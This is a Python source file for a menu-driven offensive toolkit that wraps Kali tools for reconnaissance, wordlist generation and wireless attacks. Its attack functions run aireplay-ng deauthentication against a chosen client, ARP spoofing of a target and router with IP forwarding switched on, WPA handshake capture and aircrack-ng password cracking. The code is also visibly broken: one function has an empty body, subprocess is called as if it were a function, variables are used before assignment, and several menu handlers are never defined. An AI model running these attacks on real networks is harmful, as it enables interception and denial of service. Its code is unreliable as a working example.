#!/usr/bin/env python3
import subprocess
from subprocess import Popen
from scapy.all import *
import argparse
import time
def recon_ng():
    
def the_harvester(domain, shodan,source,takeover):
    if shodan=='-s' and source !='no':
        if takeover=='-t':
            try:
                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-t','-b',source],text=True,check_output=True)
            except subprocess.SubprocessError as error:
                print('Encountered an error: ',str(error))
        elif takeover=='no':
            try:
                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-b',source],text=True,check_output=True)
            except subprocess.SubprocessError as error:
                print('Encountered an error: ',str(error))
                
    elif shodan!='s' and source !='no':
        if takeover=='-t':
            try:
                subprocess.Popen(['sudo','theHarvester','-d',domain,'-t','-b',source],check_output=True,text=True)
            except subprocess.SubprocessError as error:
                print('Encountered an error: ',str(error))
        elif takeover=='no':
            try:
                subprocess.Popen(['sudo','theHarvester','-d',domain,'-b',source],check_output=True,text=True)
            except subprocess.SubprocessError as error:
                print('Encountered an error: ',str(error))
    elif shodan=='-s' and source=='no':
        if takeover=='-t':
            try:
                subprocess.Popen(['sudo','theHarvester','-d',domain,'-s','-t'],check_output=True,text=True)
            except subprocess.SubprocessError as error:
                print('Encountered an error: ',str(error))
        elif takeover=='no':
            try:
                subprocess(['sudo','theHarvester','-d',domain,'-s'],check_output=True,text=True)
            except subprocess.SubprocessEror as error:
                print('Encountered an error: ',str(error))
    elif shodan!='-s' and source=='no':
        if takeover=='-t':
            try:
                subprocess(['sudo','theHarvester','-d',domain,'-t'],check_output=True,text=True)
            except subprocess.SubprocessError as error:
                print('Encountered an error: ',str(error))
        elif takeover=='no':
            try:
                subprocess(['sudo','theHarvester','-d',domain],check_output=True,text=True)
            except subprocess.SubprocessError as error:
                print('Encountered an eror: ',str(error))
def maltego():
    try:
        subprocess(['sudo','maltego'],text=True, capture_output=True)
    except subprocess.SubprocessError as error:
        print('Encountered an error: ',str(error))

#----OSINT main menu------
def osint():
    while True:
        print('''
[1] Maltego
[2] theHarvester
[3] Recon-ng
[4] Whois
[5] Nikto

[RECON_MENU] Return to Scanning and Reconnaissance menu
[BACK] Back to main menu
''')
        osintOption=input('Select an option: ')
        if osintOption=='1':
            maltego()
        elif osintOption=='2':
            domain=input('Enter the domain name to search: ')
            shodan=input('Do you want to use Shodan to search [y/n]: ')
            if shodan=='y':
                shodan='-s'
            elif shodan=='n':
                shodan='no'
            else:
                print('Invalid option.')
            source=input('Do you want to use a source to search? (e.g. virustotal,duckduckgo) [y/n]: ')
            if source=='y':
                source=input('Enter the name of the source you want to use: ')
            elif source=='n':
                source='no'
            else:
                print('Invalid option.')
            takeover=input('Do you want to search for takeovers [y/n]: ')
            if takeover=='y':
                takeover='-t'
            elif takeover=='n':
                takeover='no'
            else:
                print('Invalid option.')
            
            the_harvester(domain, shodan,source,takeover)
        elif osintOption=='3':
            recon_ng()
        elif osintOption=='4':
            whois()
        elif osintOption=='5':
            nikto()
        elif osintOption=='RECON_MENU':
            recon()
        elif osintOption=='BACK':
            main()
        else:
            print('Invalid option')
#-------Zenmap------
def zenmap_menu():
    try:
        subprocess(['sudo','zenmap'],text=True, capture_output=True)
    except subprocess.subprocessError as error:
        print('Encountered error: ',str(error))

#-----------------------------------
def scan(nmap_choice,target,port_range,if_service_detection): # tcp scan
    if not if_service_detection=='-sV':
        try:
            subprocess.Popen(['sudo','nmap',nmap_choice,'-p',str(port_range),str(target)],capture_output=True,text=True)
        except subprocess.subprocessError as e:
            print('Encountered an error: ',str(e))
        except FileNotFoundError:
            print("The tool 'nmap' is not installed or not in system PATH.")
    if if_service_detection=='-sV':
        try: 
            subprocess(['sudo','nmap',nmap_choice,if_service_detection,'-p',str(port_range),str(target)],text=True, capture_output=True)
        except subprocess.subprocessError as e:
            print('Encountered an error: ',str(e))
        except FileNotFoundError:
            print("The tool 'nmap' is not installed or not in system PATH.")

def nmap_menu():
    while True:
        print('''
[1] TCP SYN scan (stealth scan) (-sS)
[2] TCP connect scan (-sT)
[3] UDP scan (-sU)
[4] TCP ACK scan (-sA)

Note: More options will be added in the future
[RECON_MENU] Return to Scanning and Reconnaissance menu
[BACK] Back to main menu
''')
        if nmap_choice=='1':
            nmap_choice=input('Choose an option: ')
            target=input('Enter the IP of the host/network you want to scan: ')
            port_range=input("Input ports to scan (all ports is 1-65535, 'top' for top 1000 ports (default) ): ")
            if_version_detection=input('Do you want version detection [y/n]: ')
            
            nmap_choice='-sS'
        elif nmap_choice=='2':
            nmap_choice=input('Choose an option: ')
            target=input('Enter the IP of the host/network you want to scan: ')
            port_range=input("Input ports to scan (all ports is 1-65535, 'top' for top 1000 ports (default) ): ")
            if_version_detection=input('Do you want version detection [y/n]: ')
            nmap_choice='-sT'
        elif nmap_choice=='3':
            nmap_choice=input('Choose an option: ')
            target=input('Enter the IP of the host/network you want to scan: ')
            port_range=input("Input ports to scan (all ports is 1-65535, 'top' for top 1000 ports (default) ): ")
            if_version_detection=input('Do you want version detection [y/n]: ')
            nmap_choice='-sU'
        elif nmap_choice=='4':
            nmap_choice=input('Choose an option: ')
            target=input('Enter the IP of the host/network you want to scan: ')
            port_range=input("Input ports to scan (all ports is 1-65535, 'top' for top 1000 ports (default) ): ")
            if_version_detection=input('Do you want version detection [y/n]: ')
            nmap_choice='-sA'
        elif nmap_choice=='RECON_MENU':
            recon()
        elif nmap_choice=='BACK':
            main()
        else:
            print('Invalid option')
        if if_version_detection=='y':
            if_version_detection='-sV'
        if port_range=='top':
            port_range='--top-ports 1000'
        if nmap_choice=='1':
            scan(nmap_choice,target,port_range,if_service_detection)
        if nmap_choice=='2':
            scan(nmap_choice,target,port_range,if_service_detection)(nmap_choice,target,port_range,if_service_detection)
        if nmap_choice=='3':
            scan(nmap_choice,target,port_range,if_service_detection)
        if nmap_choice=='4':
            scan(nmap_choice,target,port_range,if_service_detection)
    
#---------Recon main menu------------------
def recon():
    while True:
        print('''
    [1] Scan with Nmap
    [2] Scan with Zenmap (Nmap GUI)
    [3] OSINT
    [BACK] Back to main menu
    ''')
        reconOption=input('Select option: ')
        if reconOption=='1':
            nmap_menu()
        elif reconOption=='2':
            zenmap_menu()
        elif reconOption=='3':
            osint()
        elif reconOption=='BACK':
            main()
        else:
            print('Invalid option')
        
#-----------------------------------
def crack_wifi_password(cap_file, wordlist):
    try:
        results = subprocess.Popen(['sudo', 'aircrack-ng', cap_file, '-w', wordlist], text=True, capture_output=True)
        print(results.stdout)
    except subprocessError as e:
        print("Error: aircrack-ng encountered an error: str(e)")
    except FileNotFoundError:
        print("Error: One of the required files (capture file or wordlist) could not be found.")
    except Exception as ex:
        print("An unexpected error occurred: str(ex)")


#-------Wordlist--------
def crunch_passwd(min_chars, max_chars, characters, pattern, filename): # use crunch tool
    command = [
        'sudo', 'crunch', str(min_chars), str(max_chars), characters,
        '-t', pattern, '-i', filename
    ]

  
    try:
        result = subprocess.Popen(command, check_output=True, text=True)
        print(result.stdout.decode())
    except subprocess.CalledProcessError as e:
        print("Error occurred:",e.stderr.decode())




def use_cupp():
    try:
 # Run the cupp tool using subprocess
        subprocess(['sudo', 'cupp', '-i'])
    except FileNotFoundError:
        print("The 'cupp' tool is not installed or not in system PATH. ")
    except Exception as e:
        print("Something went wrong: ", str(e))
#-----------------------        
def wordlist():
    while True:
        print('''
    [1] Create a wordlist using Cupp (beginner friendly)
    [2] Create a wordlist using Crunch
    [BACK] Back to main menu
    
''')
        wordlistChoice=input('Select an option: ')
        if wordlistChoice=='1':
            use_cupp()
        elif wordlistChoice=='2':
            min_chars=input('Enter the minimum characters for the words generated: ')
            max_chars=input('Enter the maximum characters for the words generated: ')
            characters=input('Enter the characters that you would like to use (e.g. ABCD123 to include only A,B,C,D,1,2,3): ')
            pattern=input("Enter the pattern that you would like the words to have (e.g. a@@@b to generate words that starts with 'a' and ends with 'b' and contains a total of 5 characters): ")
            wordlist_file=input('Enter the name of the file you would like to save the wordlist to: ')
            crunch_passwd(min_chars,max_chars,characters,pattern,wordlist_file)
        elif wordlistChoice=='BACK':
            main()
        else:
            print('Invalid option')
            
            
            
#------Wireless Attacks-----------
def captureHandshake(bssid, channel, filename, interface): # capture a four-way handshake
    
    
    command = [
        "sudo",
        "airodump-ng",
        "--bssid", bssid,
        "--channel", channel,
        "--write", filename,
        interface
    ]

    
    try:
        subprocess(command, check=True)
    except subprocessError as e:
        print("Error running airodump-ng: ",e)

    
def arpSpoof(interface,target_ip,router_ip): # ARP spoofing


    subprocess.Popen(["sudo", "netdiscover", "-i", interface],text=True, capture_output=True)


    with open("/proc/sys/net/ipv4/ip_forward", "w") as ip:
        ip.write("1")


    subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, router_ip])
    subprocess.Popen(["arpspoof", "-i", interface, "-t", router_ip, target_ip])

def viewTraffic(interface):
    subprocess.Popen(["wireshark", "-i", interface],text=True, capture_output=True)
def deauthenticate(deauth_packets, bssid, client_mac, interface): #deauth attack
    try:
        
        command = [
            'sudo',
            'aireplay-ng',
            '--deauth', str(deauth_packets),
            '-a', bssid,
            '-c', client_mac,
            interface
        ]

        
        subprocess.Popen(command, check_output=True,text=True)
        print("Deauthentication packets sent successfully.")
    except subprocess.SubprocessError as e:
        print("An error occurred while sending deauth packets:",str(e))
    except Exception as ex:
        print("An unexpected error occurred:",str(ex))
def capture_packets(bssid, channel, interface, filename): # targeted packet capture
    
    
    subprocess(['iwconfig', interface, 'channel', str(channel)])
    
    
    print("Capturing packets on",interface,"for BSSID",bssid)
    packets = sniff(
        iface=interface, 
        bpf_filter=f'ether host {bssid}',  
        prn=lambda x: x.summary(),  
        count=0,  
        store=1   
    )
    
    
    wrpcap(filename, packets)
def get_monitor_mode_interface(): # get the name of the interface in monitor mode
    try:
        
        iwconfig_output = subprocess.check_output(['iwconfig'], stderr=subprocess.DEVNULL).decode('utf-8')
        
      
        for line in iwconfig_output.split('\n'):
            
            if " Mode:Monitor" in line:
                
                return line.split()[0]
        
        
        return None
        
    except (subprocess.SubprocessError, FileNotFoundError):
        
        return None
def sniff(interface): # start sniffing on all frequencies
    try:
        
        command = ['sudo','airodump-ng', interface, '-abg']
        
        
        subprocess(command, check=True)
    except subprocess.SubprocessError as e:
        print("An error occurred while running airodump-ng: ",str(e))
    except FileNotFoundError:
        print("airodump-ng is not installed or not found in the system path.")
    except Exception as ex:
        print("An unexpected error occurred: ",str(ex))
        
def monitor_mode(interface):
    try:
        
        subprocess(['sudo','airmon-ng', 'start', interface], check=True)
        print("Successfully started monitor mode on",interface,'\n')
    except subprocess.CalledProcessError as e:
        print("Failed to start monitor mode on ",interface,': ',e)
def wirelessAttack(): # selection of options for wireless attacks
    while True:
        print('''
    [1] Put a wireless card in monitor mode
    [2] Packet sniffing
    [3] Targeted packet sniffing
    [4] Deauth attack
    [5] ARP spoofing attack
    [6] View captured traffic
    [7] Capture WPA/WPA2 handshake
    [8] Crack WPA/WPA2 with wordlist
    [BACK] Back to main menu

    Note: Support for WEP cracking and WPS pin cracking will be added in the future. 
    ''')
        WAchoice=input('Select an option: ')
        if WAchoice=='1':
            command = ["airmon-ng", "check"]
    
            try:
                
                check_output = subprocess.Popen(command, capture_output=True, text=True, check=True)
                print("Processes that may interfere with airmon-ng:")
                print(check_output.stdout)
        
                
                kill_command = ["airmon-ng", "check", "kill"]
                kill_output = subprocess.Popen(kill_command, capture_output=True, text=True, check=True)
        
            
                print(kill_output.stdout)
        
            except subprocess.CalledProcessError as e:
                print("An error occurred while executing the command:")
                print(e.stderr)
            monInterface=input('Enter your interface name: ')
            monitor_mode(monInterface)
            monMode=get_monitor_mode_interface()
            print('The new interface name is:',monMode)
        elif WAchoice=='2':
            monMode = get_monitor_mode_interface() # interface name
            sniff(monMode)
        elif WAchoice=='3':
            monMode = get_monitor_mode_interface()
            bssid=input('Enter the BSSID of the network: ')
            channel=input('Enter the channel: ')
            interface=monMode
            filename=input('Enter the name of the file to write results to: ')
            capture_packets(bssid,channel,interface,filename)
        elif WAchoice=='4':
            monMode = get_monitor_mode_interface()
            deauth_packets=input('How many deauth packets would you like to send? ')
            bssid=input('Enter the BSSID of the network: ')
            clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
            interface=monMode
            deauthenticate(deauth_packets,bssid,clientMac,interface)
        elif WAchoice=='5':
            monMode = get_monitor_mode_interface()
            target_ip=input('Enter the target ip: ')
            router_ip=input('Enter the router ip: ')
            arpSpoof(monMode,target_ip,router_ip)
        elif WAchoice=='6':
            monMode = get_monitor_mode_interface()
            changeInterface=input('The default interface is',monMode,', would you like to change it? [y/n]: ')
            if changeInterface=='y':
                newInterface=input('Enter the name of the interface whose captured traffic you would like to view: ')
                viewTraffic(newInterface)
            elif changeInterface=='n':
                viewTraffic(monMode)
            else:
                print('invalid option')
        elif WAchoice=='7':
            monMode = get_monitor_mode_interface()
            ifDeauth=input('Would you like to deauthenticate a client to speed up the process [y/n]: ')
            if ifDeauth=='y':
                deauth_packets=input('How many deauth packets would you like to send? ')
                bssid=input('Enter the BSSID of the network: ')
                channel=input('Enter the channel # of the network: ')
                filename2=input('Enter the file name to save the captured results to: ')
                clientMac=input('Enter the MAC address of the host you would like to disconnect from the network: ')
                interface=monMode
                deauthenticate(deauth_packets,bssid,clientMac,interface)
                captureHandshake(bssid,channel,filename2,interface)
            elif ifDeauth=='n':
                bssid=input('Enter the BSSID of the network: ')
                channel=input('Enter the channel # of the network: ')
                filename2=input('Enter the file name to save the captured results to: ')
                interface=monMode
                captureHandshake(bssid,channel,filename2,interface)
        elif WAchoice=='8':
            monMode = get_monitor_mode_interface()
            print('Generate a wordlist first with option 6 on the main menu\n')
            createWordlist=input('Did you create the wordlist to use [y/n]? ')
            if createWordlist=='y':
                cap_file=input('Enter the name of the .cap file with the four-way handshake: ')
                wordlistName=input('Enter the name of the wordlist: ')
                crack_wifi_password(cap_file,wordlistName)
            elif createWordlist=='n':
                print('Taking you to the wordlist generator. Come back when you are done.')
                time.sleep(1)
                wordlist()
            else:
                print('Invalid option')
        elif WAchoice=='BACK':
            main()
            
            
                
            
#-------------------------------------        
#-------------Main--------------------
print('''

  __  .__           .__                   __   .__                __                .__   __   .__  __   
_/  |_|  |__   ____ |  |__ _____    ____ |  | _|__| ____    _____/  |_  ____   ____ |  | |  | _|__|/  |_ 
\   __\  |  \_/ __ \|  |  \\__  \ _/ ___\|  |/ /  |/    \  / ___\   __\/  _ \ /  _ \|  | |  |/ /  \   __\
 |  | |   Y  \  ___/|   Y  \/ __ \\  \___|    <|  |   |  \/ /_/  >  | (  <_> |  <_> )  |_|    <|  ||  |  
 |__| |___|  /\___  >___|  (____  /\___  >__|_ \__|___|  /\___  /|__|  \____/ \____/|____/__|_ \__||__|  
           \/     \/     \/     \/     \/     \/       \//_____/                              \/         

#######################################
#        Author & Maintainer:         #
#                                     #
#            Shu-Hao Liu              #
#                                     #
#######################################

Tip: Switch to root before running this tool to get a smoother experience

''')

def main():
    while True:
        print('''
[1] Wireless Attacks
[2] Scanning and Reconnaissance
[3] Social Engineering Attacks
[4] Payload Generator
[5] Password Attacks
[6] Create a wordlist

''')

        choice1= input('Select an option: ')

        if choice1=='1':
            wirelessAttack()
        elif choice1=='2':
            recon()
        elif choice1=='3':
            socialEngineering()
        elif choice1=='4':
            payload()
        elif choice1=='5':
            passwdAttacks()
        elif choice1=='6':
            wordlist()
        else:
            print('Invalid option')
#-----------------------------------
main()
